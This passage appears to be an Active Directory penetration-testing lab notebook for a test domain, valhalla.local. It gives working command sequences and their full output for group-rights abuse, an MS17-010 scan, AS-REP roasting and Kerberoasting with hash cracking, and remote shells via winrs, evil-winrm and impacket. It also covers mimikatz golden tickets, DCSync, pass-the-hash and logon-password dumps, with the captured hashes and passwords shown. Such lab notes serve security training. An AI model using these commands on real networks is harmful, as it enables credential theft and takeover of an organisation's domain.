	Oturum açma kodu
	Kullanıcı profili
	Ana dizin
	Son oturum açma                       Asla

	İzin verilen oturum açma saatleri     Tümü

	Yerel Grup Üyeliği
	Genel Grup üyeliği                    *Domain Users
	Komut başarıyla tamamlandı.


We will check bloodhound and user has GenericAll rights for group

![image](https://user-images.githubusercontent.com/13157446/129450825-b5431b47-a3ce-4b2d-99c4-148090b4b631.png)

dontmindme user can add any user to this group

	PS C:\Users\testuser\Desktop\sharphound> net group "Domain Admins" /domain
	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.

	Grup adı     Domain Admins
	Açıklama     Designated administrators of the domain

	Üyeler

	-------------------------------------------------------------------------------
	Administrator            THOR$
	Komut başarıyla tamamlandı.

	PS C:\Users\testuser\Desktop\sharphound>

Try to add with different user

	PS C:\Users\testuser\Desktop\sharphound> net group "Domain Admins" iwouldmind /add /domain
	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.

	5 sistem hatası oldu.

	Erişim engellendi.

try to add with idontmind user

![image](https://user-images.githubusercontent.com/13157446/129451269-4c579420-0e72-47be-b612-1081a906bd9c.png)


## ms17_010_eternalblue

### smb_ms17_010

	msf6 auxiliary(scanner/smb/smb_ms17_010) > run

	[+] 192.168.200.110:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
	[*] 192.168.200.110:445   - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
	msf6 auxiliary(scanner/smb/smb_ms17_010) > 

## AS-REP Roasting

If Kerberos Pre-Authentication is enabled, a [Timestamp](https://ldapwiki.com/wiki/Timestamp) will be [encrypted](https://ldapwiki.com/wiki/Encrypted) using the user's [password](https://ldapwiki.com/wiki/Password) [hash](https://ldapwiki.com/wiki/Hash) as an [encryption](https://ldapwiki.com/wiki/Encryption) [key](https://ldapwiki.com/wiki/Key). If the [KDC](https://ldapwiki.com/wiki/KDC) reads a valid time when using the user's password hash, which is available in the [Microsoft Active Directory](https://ldapwiki.com/wiki/Microsoft%20Active%20Directory), to decrypt the [Timestamp](https://ldapwiki.com/wiki/Timestamp), the [KDC](https://ldapwiki.com/wiki/KDC) knows that request isn't a replay of a previous request.

Without Kerberos Pre-Authentication a [malicious](https://ldapwiki.com/wiki/Malicious) [attacker](https://ldapwiki.com/wiki/Attacker) can directly send a dummy request for [authentication](https://ldapwiki.com/wiki/Authentication). The [KDC](https://ldapwiki.com/wiki/KDC) will return an [encrypted](https://ldapwiki.com/wiki/Encrypted) [TGT](https://ldapwiki.com/wiki/TGT) and the [attacker](https://ldapwiki.com/wiki/Attacker) can brute force it offline.

### Generate vulnerability

Activate

![image](https://user-images.githubusercontent.com/13157446/129409430-5b5cc59e-5ed3-4370-b8bf-f1fe1a00ef98.png)

### Exploitation


Run Rubeus

	PS C:\Users\thor\Desktop> .\Rubeus.exe asreproast /outfile:hash.txt /format:hashcat

	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/

	  v1.6.4


	[*] Action: AS-REP roasting

	[*] Target Domain          : valhalla.local

	[*] Searching path 'LDAP://odin.valhalla.local/DC=valhalla,DC=local' for AS-REP roastable users
	[*] SamAccountName         : roastme
	[*] DistinguishedName      : CN=roastme,CN=Users,DC=valhalla,DC=local
	[*] Using domain controller: odin.valhalla.local (192.168.200.100)
	[*] Building AS-REQ (w/o preauth) for: 'valhalla.local\roastme'
	[+] AS-REQ w/o preauth successful!
	[*] AS-REP hash:

		  $krb5asrep$roastme@valhalla.local:F4871226F4E82B420B51A83FF0ADC8ED$7BA4EC10E4675
		  3B204A053744C7B003E5DDBC699CD6B3DB541865246D3E1ED7C798DE2245040824916266EBACF959
		  1A663AF9A85129F51474CD250DAF4F290D24DCEAA196CC28B807431D4222EF1CDCBA40835FF6FC1A
		  CF607A0291412D4E59E181359B6452AABC55B917C064A38EEDE9FEC825EA1DD72414FAE178691A4C
		  541F26822317CB8B894E63581C90DD56A1D38DF0C1809F6A13B4166C4FB04A64C17ECF86D2538AF5
		  C3BA2E4EE2D101BAD135EE6B3784DBC36BD94AFCC79E0271F9B84D3E1BA73659202FD15AB9B37EF4
		  EEFB4C8318395D9FC80D8F83751030F799419BF16FED209F3BC2CFFB15FB9EBBC6A
	
	
Crack it 

	hashcat -m 18200 hash.txt 500.txt --force 

## Kerberoasting


During this attack, an adversary attempts to enumerate the Service Principal Name (SPNs) of service accounts through crafted LDAP queries



### Generate vulnerability

Create OU for service accounts

![image](https://user-images.githubusercontent.com/13157446/129405912-68180d26-1ab2-447f-9e59-4d8f123ffec9.png)


Create service account

	#requires -module ActiveDirectory

	$destou="OU=Service Accounts,DC=valhalla,DC=local"

	$psw = convertto-securestring "Pass123!" -asplaintext -force
	New-ADUser -Path $destou -Name "kerberoastme"  -AccountPassword $psw -Enabled $true -AllowReversiblePasswordEncryption $false -CannotChangePassword $true -PasswordNeverExpires $true

Set SPN for service account

![Pasted image 20210813214029](https://user-images.githubusercontent.com/13157446/129405121-db8df286-38e3-4d16-a601-3bde3cf1da20.png)


### Exploitation

Enum SPN users with Rubeus


	PS C:\Users\thor\Desktop> .\Rubeus.exe kerberoast

	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/

	  v1.6.4


	[*] Action: Kerberoasting

	[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
	[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

	[*] Searching the current domain for Kerberoastable users

	[*] Total kerberoastable users : 1


	[*] SamAccountName         : kerberoastme
	[*] DistinguishedName      : CN=kerberoastme,OU=Service Accounts,DC=valhalla,DC=local
	[*] ServicePrincipalName   : http/kerberoastme:80
	[*] PwdLastSet             : 13.08.2021 18:25:06
	[*] Supported ETypes       : RC4_HMAC_DEFAULT
	[*] Hash                   : $krb5tgs$23$*kerberoastme$valhalla.local$http/kerberoastme:80*$B186F27C57F71BA5F
								 241C8F4CEC3403D$A9F7BD89F86353311FAC0F723D490CEE6D045ABA26D43922AFF80BA6407219F8
								 AD5922E6C0681F3DCF8744B43C194CD52963C7667821068581058CFC7D98FD270E7BC5675E737B09
								 F35D9E646CECE872EC5731B272456C74BD6A8F15EF7F01ED90731CEF75C65B58C299CFC740F528B2
								 6B4CD0FB19929C81B474B0C4805D68680EA4E7C6B52433A16A8FFF72B7057D9E5BCC08931CD6E993
								 ACC28E2AEA5222EDDF3FAB46409D0D4348256F5D2C5E5EBACCE9A9DE1F4C1A498DA6F7A03BE83953
								 0109356BA479577185777F62A01803CC8F2FC9656FAF8AC6E0A2500F0CB5D539C2ABD4CD1A978B1A
								 777C840AA2B29DE5E10BC17F5DA3A343D639C13705359E91D2CE0D3F027784BDBDE049F119FC944C
								 975EE01CA80957640C985B13A99C0B8D425282EAD9F1EFB5714058664FFA83303F3B507089A27FA8
								 43540B17C72D9ED051E93C1301BA4CFF6BDA4B2B94FE2E96C878938F11DB6DF7769B561FB0299B8A
								 38412DA88AB43EC49227AFC39D59440C7524EFE7E8BB2B32F0C166922F2FF11132BB6F29CEE0A6B8
								 72BD55C119BAC3A620D0D13223ABCAC2ABAFB19B1599524293DADAC156337C34DB0E6AF072F90143
								 7FFA78BD944905947852F551AED626FD3617E50F6DB90E0442A5E9C5696E0B5FCCF40122ED22D344
								 997C7A928B19679CDB86D150CC840CA763F587359822B7C31138BEFA2C97CBFF4DA29C577F7685FD
								 86C277B12902E8EB36228AB75F331A952D98AFDD6573CD97EFF8C5C786B2C1B6A5B767873273F1D7
								 231E785CE95CC92E2985707124FA18EE4D0FA80CBB82A843BFD6B7B8948210C2482CA4FB7DE7ABD9
								 BBFB42BA5779AFDFA9480DBC36171243ABA03D08FA541BE39937B13ABF68BF81CC4B658FF928FDD7
								 D7C4465D6661D1D87EC1924796D4A3B9EC26CABD5EBA1E4034C3B9D7A6CEB956D07DE65F5DC6AC66
								 A83C355F8E3863A13E616F6CC26CA915850A071209987AC640F429499CC57C3E7B3F750434BE8B2D
								 30BB264733415B5008EF4B3342A6F8F395698932D07181B7A6CCBEA5735E034B2C6C6A21C3B17991
								 58AD4C0F012B2AA3FFA99E7BC13F738FCF79877DEC4425D79C755EC7D1C20061A47D9DD61A02D40D
								 10A13F2DC862DE99DAB8530C3839BDA09E3F9A49887E51E2A1C1A98A0294C200F472D95E79B7824B
								 200A6342961613E1B2B986916DF92C0CEA020CDC6CB495DF08BE5B505821D537F1105CD23B359040
								 88967AC0301801A6F3B3703BDB007DF6042798D806D2CA97639BFDD4383F835B946049ABA764BD8F
								 54FC2C5C500EE9D5E2720024A9AC1FE76D022F0A19073476F5E067FF167A179B4B5EC285217D09ED
								 F08E16DECB81A15F8CC3AE2D98FF9BAFEA3191A5912E9022799EAF418BEE9E997DFB66F5D06EB92A
								 B4BDC1BBBA491E3A9BCD594692ACCE4959701051D2B1770689817B4497


Save hashcat format


	PS C:\Users\thor\Desktop> .\Rubeus.exe kerberoast /outfile:hash.txt /format:hashcat

	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/

	  v1.6.4


	[*] Action: Kerberoasting

	[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
	[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

	[*] Searching the current domain for Kerberoastable users

	[*] Total kerberoastable users : 1


	[*] SamAccountName         : kerberoastme
	[*] DistinguishedName      : CN=kerberoastme,OU=Service Accounts,DC=valhalla,DC=local
	[*] ServicePrincipalName   : http/kerberoastme:80
	[*] PwdLastSet             : 13.08.2021 18:25:06
	[*] Supported ETypes       : RC4_HMAC_DEFAULT
	[*] Hash written to C:\Users\thor\Desktop\hash.txt

	[*] Roasted hashes written to : C:\Users\thor\Desktop\hash.txt


Crack with hashcat


	hashcat -m 13100 hash.txt 500.txt --force 



# Remote Code Execution

## WinRS

	PS C:\Users\testuser> winrs.exe -r:odin.valhalla.local -u:administrator -p:Pass123! "cmd /c whoami & hostname & ipconfig
	"
	valhalla\administrator
	odin

	Windows IP Configuration


	Ethernet adapter Ethernet0:

	   Connection-specific DNS Suffix  . :
	   Link-local IPv6 Address . . . . . : fe80::d130:77d8:36c:afe%12
	   IPv4 Address. . . . . . . . . . . : 192.168.200.100
	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
	   Default Gateway . . . . . . . . . :

	Tunnel adapter isatap.{82B0F91C-D6B0-48AA-935A-1CCE190951A5}:

	   Media State . . . . . . . . . . . : Media disconnected
	   Connection-specific DNS Suffix  . :

## Evil-WinRM

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ evil-winrm -i 192.168.200.100 -u administrator -p Pass123!                                                                                     1 ⚙

	Evil-WinRM shell v3.2

	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

	Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

	Info: Establishing connection to remote endpoint

	*Evil-WinRM* PS C:\Users\Administrator\Documents> pwd

	Path
	----
	C:\Users\Administrator\Documents


	*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
	valhalla\administrator
	*Evil-WinRM* PS C:\Users\Administrator\Documents> 


## Impacket

### wmiexec
	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ /usr/bin/impacket-wmiexec valhalla/administrator:Pass123\!@192.168.200.100                                                                 1 ⨯ 1 ⚙
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] SMBv3.0 dialect used
	[!] Launching semi-interactive shell - Careful what you execute
	[!] Press help for extra shell commands
	C:\>whoami
	valhalla\administrator

### smbexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ /usr/bin/impacket-smbexec valhalla/administrator:Pass123\!@192.168.200.100                                                                     1 ⚙
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[!] Launching semi-interactive shell - Careful what you execute
	C:\Windows\system32>whoami
	nt authority\system


### psexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ /usr/bin/impacket-psexec valhalla/administrator:Pass123\!@192.168.200.100                                                                  1 ⨯ 1 ⚙
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] Requesting shares on 192.168.200.100.....
	[*] Found writable share ADMIN$
	[*] Uploading file SJmjamtF.exe
	[*] Opening SVCManager on 192.168.200.100.....
	[*] Creating service qeWU on 192.168.200.100.....
	[*] Starting service qeWU.....
	[!] Press help for extra shell commands
	Microsoft Windows [Version 6.3.9600]
	(c) 2013 Microsoft Corporation. All rights reserved.

	C:\Windows\system32>whoami
	nt authority\system


# Post-Exploitation

## Golden Ticket

activate debug mode

	mimikatz # privilege::debug
	
	
Get krbtgt user hash and sid value (remote) (fail because authentication problem)

	mimikatz # lsadump::dcsync /domain:valhalla.local /user:krbtgt
	[DC] 'valhalla.local' will be the domain
	[DC] 'odin.valhalla.local' will be the DC server
	[DC] 'krbtgt' will be the user account
	[rpc] Service  : ldap
	[rpc] AuthnSvc : GSS_NEGOTIATE (9)
	ERROR kull_m_rpc_drsr_getDCBind ; RPC Exception 0x00000005 (5)
	
	
Get krbtgt user hash and sid value (remote) 

	mimikatz # lsadump::dcsync /domain:valhalla.local /user:krbtgt /authuser:administrator /authpassword:Pass123!
	[DC] 'valhalla.local' will be the domain
	[DC] 'odin.valhalla.local' will be the DC server
	[DC] 'krbtgt' will be the user account
	[rpc] Service  : ldap
	[rpc] AuthnSvc : GSS_NEGOTIATE (9)
	[rpc] Username : administrator
	[rpc] Domain   : 
	[rpc] Password : Pass123!

	Object RDN           : krbtgt

	** SAM ACCOUNT **

	SAM Username         : krbtgt
	Account Type         : 30000000 ( USER_OBJECT )
	User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
	Account expiration   : 
	Password last change : 13.08.2021 07:22:10
	Object Security ID   : S-1-5-21-3410397846-649609989-2919355437-502
	Object Relative ID   : 502

	Credentials:
	  Hash NTLM: c2d3b9268608fab2b14a8c78c36316aa
		ntlm- 0: c2d3b9268608fab2b14a8c78c36316aa
		lm  - 0: 36fa5c99898f8a75a7783f250a6bf892


Generate Golden Ticket

	mimikatz # kerberos::golden /domain:valhalla.local /sid:S-1-5-21-3410397846-649609989-2919355437 /rc4:c2d3b9268608fab2b14a8c78c36316aa /id:500 /user:IgotGoldenTicketCharlie
	User      : IgotGoldenTicketCharlie
	Domain    : valhalla.local (VALHALLA)
	SID       : S-1-5-21-3410397846-649609989-2919355437
	User Id   : 500
	Groups Id : *513 512 520 518 519 
	ServiceKey: c2d3b9268608fab2b14a8c78c36316aa - rc4_hmac_nt      
	Lifetime  : 14.08.2021 01:11:51 ; 12.08.2031 01:11:51 ; 12.08.2031 01:11:51
	-> Ticket : ticket.kirbi

	 * PAC generated
	 * PAC signed
	 * EncTicketPart generated
	 * EncTicketPart encrypted
	 * KrbCred generated

	Final Ticket Saved to file !
	
	
	
Inject ticket to current session
	
	mimikatz # kerberos::ptt ticket.kirbi

	* File: 'ticket.kirbi': OK


Open new cmd with injected ticket

	mimikatz # misc::cmd
	Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 000000004AC49C78

Access remote pc with normal shell

![image](https://user-images.githubusercontent.com/13157446/129424592-e3ed2a44-da5b-4092-a510-ec0c82c379af.png)


![image](https://user-images.githubusercontent.com/13157446/129424244-a7789524-03b0-454f-9c31-00ea922325a1.png)


Access remote pc 

![image](https://user-images.githubusercontent.com/13157446/129424569-f6d10db2-4e5f-402d-beb9-f827cb25fada.png)


![image](https://user-images.githubusercontent.com/13157446/129424166-5296aee2-0d58-4906-8331-19c1d34e3526.png)


## Machine Domain admin-Use machine NTLM hash

	We need Local Admin rights on machine

	PS C:\Users\testuser\Desktop\mimikatz\x64> whoami
	thor\win7
	PS C:\Users\testuser\Desktop\mimikatz\x64> net user win7
	Kullanıcı adı                         win7
	Tam ad
	Açıklama
	Kullanıcı açıklaması
	Ülke kodu                             (null)
	Hesap etkin                           Evet
	Hesap zaman aşımı                     Asla

	Parolanın son ayarlanmadı             12.08.2021 23:35:30
	Parola süre sonu                      23.09.2021 23:35:30
	Değişebilir parola                    13.08.2021 23:35:30
	Parola gerekli                        Hayır
	Kullanıcı parolayı değiştirebilir     Evet

	İzin verilen iş istasyonları          Tümü
	Oturum açma kodu
	Kullanıcı profili
	Ana dizin
	Son oturum açma                       14.08.2021 13:08:24

	İzin verilen oturum açma saatleri     Tümü

	Yerel Grup Üyeliği                    *Administrators
										  *Users
	Genel Grup üyeliği                    *None
	Komut başarıyla tamamlandı.


Use mimikatz and read machine NTLM hash

	Using 'Machine_hash.txt' for logfile : OK

	mimikatz # privilege::debug
	Privilege '20' OK

	mimikatz # sekurlsa::logonpasswords

	Authentication Id : 0 ; 996 (00000000:000003e4)
	Session           : Service from 0
	User Name         : THOR$
	Domain            : VALHALLA
	Logon Server      : (null)
	Logon Time        : 14.08.2021 01:02:17
	SID               : S-1-5-20
		msv :	
		 [00000003] Primary
		 * Username : THOR$
		 * Domain   : VALHALLA
		 * NTLM     : f7e21314c3fb5d1c48a2d9d5b42b552c
		 * SHA1     : 9ec0546cae764e724a6348ada07efd896ab76458
		tspkg :	
		wdigest :	
		 * Username : THOR$
		 * Domain   : VALHALLA
		 * Password : [:2vH;zH;7:r5PFCpinFuTxF(h90)u7l]H'ieAt'KQ32YEU\4EpM3xLbILI;O\?0?8B6Biq?r&zzB(OeGa7li\3SOLLw+@AlCnqi7HF\UC4id)U++!=Djd_M
		kerberos :	
		 * Username : thor$
		 * Domain   : VALHALLA.LOCAL
		 * Password : [:2vH;zH;7:r5PFCpinFuTxF(h90)u7l]H'ieAt'KQ32YEU\4EpM3xLbILI;O\?0?8B6Biq?r&zzB(OeGa7li\3SOLLw+@AlCnqi7HF\UC4id)U++!=Djd_M
		ssp :	
		credman :	


Pash-the-Hash machine NTLM hash and spawn a CMD


	mimikatz # sekurlsa::pth /user:thor$ /domain:valhalla.loal /ntlm:f7e21314c3fb5d1c48a2d9d5b42b552c
	user	: thor$
	domain	: valhalla.loal
	program	: cmd.exe
	impers.	: no
	NTLM	: f7e21314c3fb5d1c48a2d9d5b42b552c
	  |  PID  1152
	  |  TID  752
	  |  LSA Process is now R/W
	  |  LUID 0 ; 2116305 (00000000:00204ad1)
	  \_ msv1_0   - data copy @ 000000000184D290 : OK !
	  \_ kerberos - data copy @ 000000000185DD68
	   \_ aes256_hmac       -> null             
	   \_ aes128_hmac       -> null             
	   \_ rc4_hmac_nt       OK
	   \_ rc4_hmac_old      OK
	   \_ rc4_md4           OK
	   \_ rc4_hmac_nt_exp   OK
	   \_ rc4_hmac_old_exp  OK
	   \_ *Password replace @ 00000000018FEF78 (16) -> null


![image](https://user-images.githubusercontent.com/13157446/129442879-3f6bdbfe-b0c9-45ed-8ed6-39331d5f2a77.png)

regular cmd shell (access denied)

![image](https://user-images.githubusercontent.com/13157446/129442954-661ab321-9c6b-4a35-9d6f-48e21d0821d1.png)


## Credential Collection

### mimikatz logonpasswords

 cmd needs to run administrators rights / locally

	PS C:\Users\thor\Desktop\mimikatz\x64> .\mimikatz.exe

	  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilki
	 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
	 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gm
	  '#####'        > https://pingcastle.com / https://mysmartlogon

	mimikatz # privilege::debug
	Privilege '20' OK

	mimikatz # sekurlsa::logonpasswords

	Authentication Id : 0 ; 5990364 (00000000:005b67dc)
	Session           : CachedInteractive from 1
	User Name         : Administrator
	Domain            : VALHALLA
	Logon Server      : ODIN
	Logon Time        : 13.08.2021 11:47:21
	SID               : S-1-5-21-3410397846-649609989-2919355437-500
			msv :
			 [00000003] Primary
			 * Username : Administrator
			 * Domain   : VALHALLA
			 * LM       : 4fb7d301186e0eb3695109ab020e401c
			 * NTLM     : c718f548c75062ada93250db208d3178
			 * SHA1     : b27655136bebed1e53ded6cb9f837c450e7bb524
			tspkg :
			 * Username : Administrator
			 * Domain   : VALHALLA
			 * Password : Pass123!
			wdigest :
			 * Username : Administrator
			 * Domain   : VALHALLA
			 * Password : Pass123!
			kerberos :
			 * Username : Administrator
			 * Domain   : VALHALLA.LOCAL
			 * Password : Pass123!
			ssp :
			credman :
			
			
### mimikatz dcsync

authuser should be admin rights

	mimikatz # lsadump::dcsync /domain:valhalla.local /user:krbtgt /authuser:administrator /authpassword:Pass123!
	[DC] 'valhalla.local' will be the domain
	[DC] 'odin.valhalla.local' will be the DC server
	[DC] 'krbtgt' will be the user account
	[rpc] Service  : ldap
	[rpc] AuthnSvc : GSS_NEGOTIATE (9)
	[rpc] Username : administrator
	[rpc] Domain   :
	[rpc] Password : Pass123!

	Object RDN           : krbtgt

	** SAM ACCOUNT **

	SAM Username         : krbtgt
	Account Type         : 30000000 ( USER_OBJECT )
	User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
	Account expiration   :
	Password last change : 13.08.2021 07:22:10
	Object Security ID   : S-1-5-21-3410397846-649609989-2919355437-502
	Object Relative ID   : 502

	Credentials:
	  Hash NTLM: c2d3b9268608fab2b14a8c78c36316aa
		ntlm- 0: c2d3b9268608fab2b14a8c78c36316aa
		lm  - 0: 36fa5c99898f8a75a7783f250a6bf892
